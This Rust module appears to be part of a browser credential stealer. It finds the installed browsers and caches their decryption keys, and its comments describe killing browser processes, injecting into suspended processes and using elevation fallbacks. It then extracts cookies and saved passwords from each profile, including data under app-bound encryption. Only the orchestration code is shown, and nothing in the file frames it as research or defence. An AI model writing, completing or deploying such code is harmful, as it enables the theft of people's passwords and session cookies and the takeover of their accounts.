pub mod base;

use crate::browsers::common::paths;

fn cache_all_browsers(allow_inject: bool) {
    let installed = paths::discover_installed_browsers();
    let handles: Vec<_> = installed
        .into_iter()
        .map(|browser| {
            std::thread::spawn(move || {
                let user_data = paths::user_data_path(&browser);
                base::cache_keys_for_browser(&browser.name, &user_data, browser.has_profiles, allow_inject);
            })
        })
        .collect();
    for handle in handles {
        let _ = handle.join();
    }
}

/// After kill, before inject: read cookies/passwords from unlocked DBs (DPAPI / elev / dpf).
pub fn extract_pre_inject() -> Vec<(String, String)> {
    cache_all_browsers(false);
    base::extract_cookies_passwords_from_cache()
}

/// Upgrade cached keys via suspended inject (+ elev/dpf fallbacks).
pub fn inject_and_cache_all() {
    cache_all_browsers(true);
}

/// Full profile extract using final cached keys (incl. app-bound for v20).
pub fn extract_all_from_cache() -> Vec<(String, String)> {
    base::extract_all_from_cache()
}

#[allow(dead_code)]
pub fn extract_all() -> Vec<(String, String)> {
    let pre = extract_pre_inject();
    inject_and_cache_all();
    let mut out = extract_all_from_cache();
    crate::browsers::merge_files(&mut out, pre);
    out
}

pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
    base::extract_cookies_post_kill()
}
